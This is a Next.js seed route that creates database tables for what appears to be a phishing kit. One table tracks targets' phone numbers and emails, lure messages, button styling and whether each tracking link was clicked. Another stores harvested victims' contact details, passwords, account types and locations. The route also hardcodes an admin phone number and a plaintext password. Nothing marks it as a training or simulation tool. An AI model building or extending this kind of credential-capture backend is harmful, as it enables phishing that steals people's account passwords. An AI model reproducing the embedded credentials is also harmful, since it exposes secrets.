// One-time seed route — DELETE this file after running it once.
import { NextResponse } from "next/server";
import { Pool, neonConfig } from "@neondatabase/serverless";
import ws from "ws";

// Use WebSocket instead of HTTP fetch — bypasses fetch restrictions
neonConfig.webSocketConstructor = ws;

export async function GET() {
  // Strip channel_binding=require — not supported by the serverless WebSocket pool
  const connStr = (process.env.DATABASE_URL ?? "").replace(/[&?]channel_binding=require/g, "");
  const pool = new Pool({ connectionString: connStr });
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS cyber_attacks (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        sender_id UUID NOT NULL,
        target_phone VARCHAR(30) DEFAULT 'unset',
        target_email TEXT DEFAULT 'unset',
        attack_type VARCHAR(100) NOT NULL,
        email_subject TEXT DEFAULT 'unset',
        message TEXT NOT NULL,
        button_name TEXT NOT NULL,
        button_color TEXT NOT NULL,
        response_status TEXT DEFAULT 'Link not clicked',
        status_info TEXT DEFAULT 'Target has not yet clicked on the link',
        link_id VARCHAR(64) NOT NULL UNIQUE,
        link_url TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT NOW()
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS cyber_hacked (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        receiver_id UUID NOT NULL,
        name TEXT DEFAULT '',
        phone_or_email TEXT NOT NULL,
        password TEXT NOT NULL,
        account_type VARCHAR(100) NOT NULL,
        location TEXT DEFAULT '',
        link_id VARCHAR(64) NOT NULL,
        seen BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT NOW()
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS sqli_admin (
        id INTEGER PRIMARY KEY,
        login_number TEXT NOT NULL,
        gender VARCHAR(20) NOT NULL DEFAULT 'male',
        login_password TEXT NOT NULL
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS sqli_login_date (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        log_in_date TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT NOW()
      )
    `);

    await pool.query(`
      INSERT INTO sqli_admin (id, login_number, gender, login_password)
      VALUES (1, '0962464552', 'male', '#Chandamark1')
      ON CONFLICT (id) DO UPDATE
        SET login_number = EXCLUDED.login_number,
            gender = EXCLUDED.gender,
            login_password = EXCLUDED.login_password
    `);

    return NextResponse.json({
      success: true,
      message: "All cyber tables created and seeded. Delete src/app/api/cyber/seed/route.ts now.",
    });
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  } finally {
    await pool.end();
  }
}
